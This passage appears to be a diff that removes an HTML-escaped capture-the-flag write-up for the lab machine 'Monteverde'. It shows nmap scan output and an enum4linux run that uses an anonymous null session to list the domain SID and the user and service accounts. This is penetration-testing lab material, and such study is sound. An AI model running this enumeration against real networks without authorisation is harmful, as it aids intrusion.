- &lt;span class=&quot;s&quot;&gt;_http-server-header&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Microsoft-HTTPAPI/2.0&lt;/span&gt;
- &lt;span class=&quot;s&quot;&gt;_http-title&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Not Found&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;9389/tcp  open  mc-nmf        .NET Message Framing&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;49667/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.0&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;49674/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;49675/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;49706/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;49778/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;SF-Port53-TCP:V=7.80%I=7%D=5/26%Time=5ECCD5D6%P=x86_64-pc-linux-gnu%r(DNSV&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;SF:ersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;SF:x04bind\0\0\x10\0\x03&quot;);&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Service Info&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;MONTEVERDE; OS&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Windows; CPE&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cpe:/o:microsoft:windows&lt;/span&gt;
-
-&lt;span class=&quot;na&quot;&gt;Host script results&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
- &lt;span class=&quot;na&quot;&gt;_clock-skew&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;-46m43s&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;smb2-security-mode&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
-    &lt;span class=&quot;s&quot;&gt;2.02&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
- &lt;span class=&quot;s&quot;&gt;_    Message signing enabled and required&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;smb2-time&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
-    &lt;span class=&quot;na&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;2020-05-26T07:55:26&lt;/span&gt;
- &lt;span class=&quot;na&quot;&gt;_  start_date&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;N/A&lt;/span&gt;
-
-&lt;span class=&quot;s&quot;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;# Nmap done at Tue May 26 14:14:49 2020 -- 1 IP address (1 host up) scanned in 728.28 seconds&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt; &lt;/p&gt;
-
-&lt;h3 id=&quot;12--enum4linux&quot;&gt;1.2 || enum4linux&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;Enum4linux&lt;/strong&gt; is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar functionality to enum.exe formerly available from www.bindview.com. 
- &lt;/p&gt;
-
-&lt;p&gt;-&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Run enum4linux&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;enum4linux 10.10.10.172&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;enum4linux 10.10.10.172&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May 26 13:41:48 &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2020&lt;/span&gt;
-
- &lt;span class=&quot;s&quot;&gt;==========================&lt;/span&gt; 
-&lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;Target&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Information&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
- &lt;span class=&quot;s&quot;&gt;========================== &lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Target ........... 10.10.10.172&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;RID Range ........ 500-550,1000-1050&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Username ......... ''&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Password ......... ''&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none&lt;/span&gt;
-
-
- &lt;span class=&quot;s&quot;&gt;====================================================&lt;/span&gt; 
-&lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;Enumerating&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Workgroup/Domain&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;10.10.10.172&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
- &lt;span class=&quot;s&quot;&gt;==================================================== &lt;/span&gt;
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Can't find workgroup/domain&lt;/span&gt;
-
-
- &lt;span class=&quot;s&quot;&gt;============================================&lt;/span&gt; 
-&lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;Nbtstat&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Information&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;10.10.10.172&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
- &lt;span class=&quot;s&quot;&gt;============================================ &lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Looking up status of 10.10.10.172&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;No reply from 10.10.10.172&lt;/span&gt;
-
- &lt;span class=&quot;s&quot;&gt;=====================================&lt;/span&gt; 
-&lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;Session&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Check&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;10.10.10.172&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
- &lt;span class=&quot;s&quot;&gt;===================================== &lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.&lt;/span&gt;
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Server 10.10.10.172 allows sessions using username '', password ''&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.&lt;/span&gt;
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Got domain/workgroup name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
-
- &lt;span class=&quot;s&quot;&gt;===========================================&lt;/span&gt; 
-&lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;Getting&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;domain&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;SID&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;10.10.10.172&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
- &lt;span class=&quot;s&quot;&gt;=========================================== &lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Domain Name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;MEGABANK&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Domain Sid&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;S-1-5-21-391775091-850290835-3566037492&lt;/span&gt;
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Host is part of a domain (not a workgroup)&lt;/span&gt;
-
- &lt;span class=&quot;s&quot;&gt;======================================&lt;/span&gt; 
-&lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;OS&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;information&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;10.10.10.172&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
- &lt;span class=&quot;s&quot;&gt;====================================== &lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.&lt;/span&gt;
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Got OS info for 10.10.10.172 from smbclient&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
-&lt;span class=&quot;s&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.&lt;/span&gt;
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Got OS info for 10.10.10.172 from srvinfo&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED&lt;/span&gt;
-
- &lt;span class=&quot;s&quot;&gt;=============================&lt;/span&gt; 
-&lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;Users&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;10.10.10.172&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
- &lt;span class=&quot;s&quot;&gt;============================= &lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0xfb6 RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0x450 acb&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0x00000210 Account&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;AAD_987d7f2f57d2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;AAD_987d7f2f57d2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Desc&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0xfd0 RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0xa35 acb&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0x00000210 Account&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;dgalanos&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Dimitris Galanos&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Desc&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(null)&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0xedb RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0x1f5 acb&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0x00000215 Account&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Guest&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(null)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Desc&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Built-in account for guest access to the computer/domain&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0xfc3 RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0x641 acb&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0x00000210 Account&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;mhope&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mike Hope&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Desc&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(null)&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0xfd1 RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0xa36 acb&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0x00000210 Account&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;roleary&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Ray O'Leary&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Desc&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(null)&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0xfc5 RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0xa2a acb&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0x00000210 Account&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;SABatchJobs&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;SABatchJobs&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Desc&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(null)&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0xfd2 RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0xa37 acb&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0x00000210 Account&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;smorgan&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Sally MorganDesc&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(null)&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0xfc6 RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0xa2b acb&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0x00000210 Account&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;svc-ata&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;svc-ata&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Desc&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(null)&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0xfc7 RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0xa2c acb&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0x00000210 Account&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;svc-bexec&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;svc-bexec&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Desc&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(null)&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0xfc8 RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0xa2d acb&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;0x00000210 Account&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;svc-netapp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;svc-netapp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Desc&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(null)&lt;/span&gt;
-
-&lt;span class=&quot;s&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;user:[Guest] rid:[0x1f5]&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;user:[AAD_987d7f2f57d2] rid:[0x450]&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;user:[mhope] rid:[0x641]&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;user:[SABatchJobs] rid:[0xa2a]&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;user:[svc-ata] rid:[0xa2b]&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;user:[svc-bexec] rid:[0xa2c]&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;user:[svc-netapp] rid:[0xa2d]&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;user:[dgalanos] rid:[0xa35]&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;user:[roleary] rid:[0xa36]&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;user:[smorgan] rid:[0xa37]&lt;/span&gt;
-
- &lt;span class=&quot;s&quot;&gt;=========================================&lt;/span&gt; 
-&lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;Share&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Enumeration&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;10.10.10.172&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
- &lt;span class=&quot;s&quot;&gt;========================================= &lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.&lt;/span&gt;
-
-&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Sharename       Type      Comment&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;---------       ----      -------&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;SMB1 disabled -- no workgroup available&lt;/span&gt;
-
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Attempting to map shares on 10.10.10.172&lt;/span&gt;
-
- &lt;span class=&quot;s&quot;&gt;====================================================&lt;/span&gt; 
-&lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;Password&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Policy&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;Information&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;10.10.10.172&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
- &lt;span class=&quot;s&quot;&gt;==================================================== &lt;/span&gt;
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Unexpected error from polenum&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-
-
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Attaching to 10.10.10.172 using a NULL share&lt;/span&gt;
-
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Trying protocol 139/SMB...&lt;/span&gt;
-
-&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;!]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Protocol failed&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Cannot request session (Called Name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;10.10.10.172)&lt;/span&gt;
-
